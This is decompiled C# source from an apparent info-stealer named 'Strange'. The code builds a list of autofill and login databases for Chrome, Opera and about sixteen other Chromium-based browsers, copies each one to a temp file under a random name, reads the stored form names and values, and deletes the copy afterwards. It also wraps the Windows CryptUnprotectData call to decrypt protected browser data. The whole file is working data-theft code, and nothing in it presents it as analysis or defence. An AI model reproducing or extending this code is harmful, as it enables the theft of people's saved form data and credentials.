using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using Strange.Additions;
using Strange.String;

namespace Strange.Main_Features
{
	// Token: 0x02000012 RID: 18
	internal class Forms
	{
		// Token: 0x06000024 RID: 36 RVA: 0x00002F1C File Offset: 0x0000111C
		public static List<FormData> GetForms()
		{
			List<FormData> list = new List<FormData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Web Data",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Web Data",
				environmentVariable + "\\Uran\\User Data\\Default\\Web Data",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Web Data",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Web Data",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Web Data",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Web Data",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Web Data",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Web Data",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Web Data",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Web Data",
				environmentVariable + "\\Flock\\User Data\\Default\\Web Data"
			};
			foreach (string basePath in array)
			{
				List<FormData> list2 = Forms.FetchForms(basePath);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x06000025 RID: 37
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Forms.DataBlob pCipherText, ref string pszDescription, ref Forms.DataBlob pEntropy, IntPtr pReserved, ref Forms.CryptprotectPromptstruct pPrompt, int dwFlags, ref Forms.DataBlob pPlainText);

		// Token: 0x06000026 RID: 38 RVA: 0x0000309C File Offset: 0x0000129C
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Forms.DataBlob dataBlob = default(Forms.DataBlob);
			Forms.DataBlob dataBlob2 = default(Forms.DataBlob);
			Forms.DataBlob dataBlob3 = default(Forms.DataBlob);
			Forms.CryptprotectPromptstruct cryptprotectPromptstruct = new Forms.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Forms.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Forms.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003260 File Offset: 0x00001460
		private static List<FormData> FetchForms(string basePath)
		{
			List<FormData> result;
			if (!File.Exists(basePath))
			{
				result = null;
			}
			else
			{
				basePath.Contains("Chrome");
				basePath.Contains("Orbitum");
				basePath.Contains("Opera");
				basePath.Contains("Amigo");
				basePath.Contains("Torch");
				basePath.Contains("Comodo");
				basePath.Contains("BlackHawk");
				basePath.Contains("AcWebBrowser");
				basePath.Contains("Baidu Spark");
				basePath.Contains("Rockmelt");
				basePath.Contains("Sleipnir");
				basePath.Contains("SRWare Iron");
				basePath.Contains("Titan Browser");
				basePath.Contains("Flock");
				basePath.Contains("CoolNovo");
				basePath.Contains("Epic Browser");
				basePath.Contains("Uran");
				try
				{
					string text = Path.GetTempPath() + "/" + NameR.GetName() + ".fv";
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					Decod decod = new Decod(text);
					List<FormData> list = new List<FormData>();
					decod.ReadTable("autofill");
					if (decod.GetRowCount() == 65536)
					{
						result = null;
					}
					else
					{
						for (int i = 0; i < decod.GetRowCount(); i++)
						{
							try
							{
								list.Add(new FormData
								{
									Name = decod.GetValue(i, 0),
									Value = decod.GetValue(i, 1)
								});
							}
							catch (Exception)
							{
							}
						}
						File.Delete(text);
						result = list;
					}
				}
				catch (Exception)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x02000013 RID: 19
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400000D RID: 13
			public int cbSize;

			// Token: 0x0400000E RID: 14
			public int dwPromptFlags;

			// Token: 0x0400000F RID: 15
			public IntPtr hwndApp;

			// Token: 0x04000010 RID: 16
			public string szPrompt;
		}

		// Token: 0x02000014 RID: 20
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000011 RID: 17
			public int cbData;

			// Token: 0x04000012 RID: 18
			public IntPtr pbData;
		}
	}
}
